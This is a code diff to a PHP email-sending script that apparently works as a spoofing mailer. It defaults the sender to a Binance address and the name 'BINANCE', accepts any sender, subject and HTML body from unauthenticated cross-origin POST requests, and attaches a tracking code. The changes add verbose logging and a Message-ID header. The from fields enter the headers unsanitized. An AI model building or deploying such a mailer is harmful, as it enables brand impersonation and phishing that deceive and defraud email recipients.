@@ -1,9 +1,13 @@
 <?php
-// Simple PHP email sending script for alias functionality
+// Enhanced PHP email sending script for alias functionality
 header('Content-Type: text/plain');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST');
 header('Access-Control-Allow-Headers: Content-Type');
+
+// Log all requests for debugging
+error_log("PHP Email Script: Request received at " . date('Y-m-d H:i:s'));
+error_log("PHP Email Script: POST data: " . print_r($_POST, true));
 
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
@@ -19,17 +23,21 @@ $from_email = $_POST['from_email'] ?? 'do_not_reply@mailersp2.binance.com';
 $from_name = $_POST['from_name'] ?? 'BINANCE';
 $tracking_code = $_POST['tracking_code'] ?? '';
 
+error_log("PHP Email Script: Parsed - To: $to, From: $from_name <$from_email>, Subject: $subject");
+
 // Validate required fields
 if (empty($to) || empty($subject) || empty($message)) {
     http_response_code(400);
-    echo "Missing required fields";
+    echo "Missing required fields: to=" . (empty($to) ? 'empty' : 'ok') . 
+         ", subject=" . (empty($subject) ? 'empty' : 'ok') . 
+         ", message=" . (empty($message) ? 'empty' : 'ok');
     exit;
 }
 
 // Validate email
 if (!filter_var($to, FILTER_VALIDATE_EMAIL)) {
     http_response_code(400);
-    echo "Invalid email address";
+    echo "Invalid email address: $to";
     exit;
 }
 
@@ -41,7 +49,8 @@ $headers = array(
     'MIME-Version' => '1.0',
     'Content-Type' => 'text/html; charset=UTF-8',
     'X-Mailer' => 'PHP/' . phpversion(),
-    'X-Tracking-Code' => $tracking_code
+    'X-Tracking-Code' => $tracking_code,
+    'Message-ID' => '<' . md5(uniqid()) . '@' . parse_url($from_email, PHP_URL_HOST) . '>'
 );
 
 // Convert headers array to string
@@ -50,13 +59,19 @@ foreach ($headers as $key => $value) {
     $header_string .= "$key: $value\r\n";
 }
 
+error_log("PHP Email Script: Headers prepared: $header_string");
+
 // Send the email
 $success = mail($to, $subject, $message, $header_string);
 
 if ($success) {
-    echo "Email sent successfully via PHP";
+    $result = "SUCCESS: Email sent from $from_name <$from_email> to $to";
+    error_log("PHP Email Script: $result");
+    echo $result;
 } else {
+    $error = "FAILED: Could not send email from $from_name <$from_email> to $to";
+    error_log("PHP Email Script: $error");
     http_response_code(500);
-    echo "Failed to send email";
+    echo $error;
 }
 ?>
